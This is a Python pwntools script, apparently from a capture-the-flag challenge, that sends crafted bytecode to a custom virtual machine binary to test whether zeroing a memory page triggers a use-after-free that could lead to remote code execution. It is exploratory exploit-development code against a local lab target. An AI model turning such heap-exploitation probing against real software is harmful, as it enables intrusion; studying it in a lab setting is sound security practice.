#!/usr/bin/env python3
"""
Test potential UAF via cleanup mechanism

If we can:
1. Create a page with code
2. Zero out that page's data
3. Trigger cleanup -> page freed
4. Allocate new data into the freed chunk
5. Execute "code" which is now our controlled data

This would be a UAF leading to RCE!
"""
from pwn import *

context.arch = 'amd64'
context.log_level = 'info'

def hlt():
    return bytes([0x00])

def mov_reg_imm(reg, imm32):
    return bytes([0x41, reg]) + p32(imm32)

def push_reg(reg):
    return bytes([0x02, reg])

# Create code that zeros out its own page then continues executing
# The page is 260 bytes: 4-byte header + 256-byte data
# Code is stored in data portion (bytes 4-259)

def create_self_zeroing_code(code_addr):
    """
    Create code that zeros itself out via PUSH, then executes more instructions.
    If cleanup happens mid-execution and frees the page, we get UAF.
    """
    code = b''
    
    # First, let's see if we can write zeros to another page and trigger cleanup
    # Write all zeros to page at 0x20000
    target_page = 0x20004  # Data starts at +4
    
    # Zero out 256 bytes (64 dwords)
    for i in range(64):
        addr = target_page + i * 4
        sp = (addr & 0xFFFFFF00) | ((addr & 0xFF) - 4)
        if (addr & 0xFF) < 4:
            sp = ((addr >> 8) - 1) << 8 | (0x100 + (addr & 0xFF) - 4)
        code += mov_reg_imm(15, sp)  # SP
        code += mov_reg_imm(0, 0)     # zero
        code += push_reg(0)
    
    # After this, the page at 0x20000 should be all zeros
    # Cleanup should free it
    # But we might still be able to read from it
    
    # Now try to read from the freed page
    sp_read = 0x20000
    code += mov_reg_imm(15, sp_read)
    code += bytes([0x03, 0])  # POP r0
    
    code += hlt()
    
    return code

p = process(['./mqda'])
p.recvuntil(b'Code Address> ')

code_addr = 0x10000
code = create_self_zeroing_code(code_addr)

print(f"[*] Code length: {len(code)} bytes")

p.sendline(str(code_addr).encode())
p.recvuntil(b'Code Length> ')
p.sendline(str(len(code)).encode())
p.recvuntil(b'Code> ')
p.send(code)
p.recvuntil(b'Entry IP> ')
p.sendline(str(code_addr).encode())

output = p.recvall(timeout=3)
print(f"Output: {output}")
p.close()
